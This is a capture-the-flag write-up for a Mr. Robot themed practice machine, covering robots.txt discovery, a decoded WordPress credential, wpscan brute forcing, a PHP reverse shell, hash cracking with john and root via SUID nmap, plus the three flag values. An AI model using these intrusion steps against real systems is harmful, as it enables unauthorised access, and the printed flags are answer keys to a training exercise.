# Task 2  Hack the machine


Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to Leon Johnson for creating this machine. This machine is used here with the explicit permission of the creator <3 

## What is key 1?
While scanning with gobuster I go for low hanging fruits. So I took a look into robots.txt. There you can find a hint for a file with key number one.

> 073403c8a58a1f80d943455fb30724b9

## What is key 2?

Found a dictionaryfile. After sorting and uniq it, I'll tried a bruteforce attack on the wordpress instance. 

While the bruteforce attack is running I was looking around. I looked into the Webpage "license". There I found a base64 snippet on the page.

```shell
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

In the meanwhile the bruteforce with `wpscan` did also solved it.

After that, we install a php-reverseshell.

I stabilized my shell with `python -c 'import pty; pty.spawn("/bin/bash")'` and after that, we looked arround. In the homedirectory of robot we found to files. To open `key2-of-3.txt` our permissions are not enough, but we can look at the `password.raw-md5`. Lets crack this with john.

With the password we change user to `robot` with `su robot`.

Now we are able to read the file.

```shell
cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959
```

> 822c73956184f694993bede3eb39f959

## What is key 3?

Okay - after some research I looked at the hint... nmap.
I did not find any interessting port... so I go for the normal stuff... suid and so `find / -perm -u=s -type f 2>/dev/null`

Oh - Nmap with SUID.

```shell
nmap --interactive
nmap> !sh
# 
# whoami
root
# cd /root
# ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

> 04787ddef27c3dee1ee161b21670b4e4

